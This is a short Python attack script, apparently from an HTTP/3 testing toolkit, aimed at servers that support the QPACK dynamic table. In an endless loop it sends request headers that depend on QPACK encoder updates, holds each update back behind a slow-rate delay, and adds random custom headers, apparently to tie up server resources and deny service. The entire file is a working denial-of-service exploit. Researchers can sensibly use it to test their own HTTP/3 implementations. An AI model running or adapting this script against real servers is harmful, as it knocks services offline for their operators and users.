
import asyncio
import random
import logging
from aioquic.h3.connection import FrameType, Setting, encode_frame
from aioquic_http3_client import USER_AGENT, HttpClient
from utils import attack_command, calculate_slowrate_wait_time, h3_connection_loop, h3_request_stream

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')


@attack_command()
@h3_connection_loop()
async def main(addr, con: HttpClient, *args, **kwargs):
    h3_con = con.http
    
    # Wait for SETTINGS frame
    for _ in range(5):
        if h3_con.received_settings:
            break
        else:
            await asyncio.sleep(1)

    assert h3_con.received_settings is not None, 'No SETTINGS frame received'
    assert h3_con.received_settings.get(Setting.QPACK_MAX_TABLE_CAPACITY, 0) > 0, 'QPACK dynamic table not supported by server'
    # assert h3_con.received_settings.get(Setting.QPACK_BLOCKED_STREAMS, 0) > 0, "QPACK blocked streams not supported by server"

    while True:
        async with h3_request_stream(con) as stream_id:
            qpack_data, header_data = h3_con._encoder.encode(stream_id, headers=[
                (b":method", b'GET'),
                (b":scheme", b'https'),
                (b":authority", f'{addr[0]}:{addr[1]}'.encode()),
                (b":path", b'/'),
                (b"user-agent", USER_AGENT.encode()),
                (f"x-custom-{random.randbytes(10).hex()}".encode(), random.randbytes(10).hex().encode()),
            ])
            h3_con._encoder_bytes_sent += len(qpack_data)
            assert len(qpack_data) > 0, 'Empty QPACK update encountered. Ensure that you have installed the patched pylsqpack library.'
            
            logging.info(f'Sending HEADERS frame "{header_data.hex()}"')
            h3_con._quic.send_stream_data(stream_id, data=encode_frame(FrameType.HEADERS, header_data), end_stream=True)
            con.transmit()

            await asyncio.sleep(calculate_slowrate_wait_time(con._quic))

            logging.info(f'Sending QPACK update "{qpack_data.hex()}"')
            h3_con._quic.send_stream_data(h3_con._local_encoder_stream_id, data=qpack_data)
            con.transmit()


if __name__ == '__main__':
    main()
